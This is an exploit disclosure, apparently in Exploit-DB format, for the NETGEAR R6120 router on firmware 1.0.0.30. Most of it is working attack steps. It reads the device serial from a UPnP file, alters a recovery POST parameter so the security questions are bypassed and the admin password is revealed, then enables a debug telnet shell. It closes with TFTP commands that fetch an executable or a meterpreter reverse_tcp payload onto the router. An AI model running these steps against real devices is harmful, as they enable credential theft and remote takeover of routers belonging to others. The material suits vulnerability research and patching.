# Exploit Title: NETGEAR WiFi Router R6120 - Credential Disclosure
# Date: 2018-10-28
# Exploit Author: Wadeek
# Hardware Version: R6120
# Firmware Version: 1.0.0.30
# Vendor Homepage: https://www.netgear.com/support/product/R6120.aspx
# Firmware Link: http://www.downloads.netgear.com/files/GDC/R6120/R6120-V1.0.0.30.zip

# == Files Containing Juicy Info ==
>> http://192.168.1.1:56688/rootDesc.xml (Server:  Unspecified, UPnP/1.0, Unspecified)
<serialNumber>SSSSSSSNNNNNN</serialNumber>

# == Security Questions Bypass > Password Disclosure ==
>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
<POST REQUEST>
htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
(replace)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
(by)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=passwordrecovered.htm&SID=
<POST RESPONSE>
">You have successfully recovered the admin password.</span>
">Router Admin Username</span>:&nbsp;admin</td>
">Router Admin Password</span>:&nbsp;Str0ng+-Passw0rd</td>

# == Authenticated Telnet Command Execution ==
>> http://admin:Str0ng+-Passw0rd@192.168.1.1/setup.cgi?todo=debug
:~$ telnet 192.168.1.1
R6120 login: admin
Password: Str0ng+-Passw0rd
{
upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]
}